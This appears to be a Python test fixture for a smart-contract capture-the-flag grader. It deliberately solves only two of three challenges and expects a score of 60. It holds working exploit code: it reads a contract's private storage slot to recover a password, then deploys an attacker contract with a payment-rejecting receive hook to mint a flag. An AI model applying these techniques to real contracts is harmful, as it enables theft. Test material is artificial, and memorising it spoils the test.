#!/usr/bin/env python3
"""Broken fixture: captures flags 1 and 8, but never solves the Challenge7
calldata puzzle.

Expected: only flag7 fails. Score 60.
"""
import json
import subprocess
import sys
from pathlib import Path


def cast(*a):
    p = subprocess.run(["cast", *a], capture_output=True, text=True, timeout=120)
    if p.returncode != 0:
        sys.exit(f"cast failed: {p.stderr[:200]}")
    return p.stdout.strip()


def send(rpc, key, to, *args, value=None):
    cmd = ["send", "--rpc-url", rpc, "--private-key", key, to, *args]
    if value is not None:
        cmd += ["--value", str(value)]
    return cast(*cmd)


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()
    send(rpc, key, p["challenge1"], "registerTeam(string,uint8)", "team", "1")

    stored = cast("storage", "--rpc-url", rpc, p["challenge8"], "1")
    masked = "0x%064x" % (int(stored, 16) & ((1 << 248) - 1))
    Path("src/H8.sol").write_text("""//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface IC8 { function mintFlag(bytes32) external payable; }
contract H8 {
    address c;
    constructor(address _c) { c = _c; }
    function go(bytes32 pw) external payable { IC8(c).mintFlag{value: 2}(pw); }
    receive() external payable { require(msg.value != 1, "no1"); }
}
""")
    subprocess.run(["forge", "build"], capture_output=True, text=True)
    code = json.loads(Path("out/H8.sol/H8.json").read_text())["bytecode"]["object"]
    h8 = json.loads(cast("send", "--rpc-url", rpc, "--private-key", key, "--create",
                         code + p["challenge8"].lower().replace("0x", "").rjust(64, "0"),
                         "--json"))["contractAddress"]
    send(rpc, key, h8, value=1000)
    send(rpc, key, h8, "go(bytes32)", masked)
    print("flags 1 and 8, no 7")


if __name__ == "__main__":
    main()
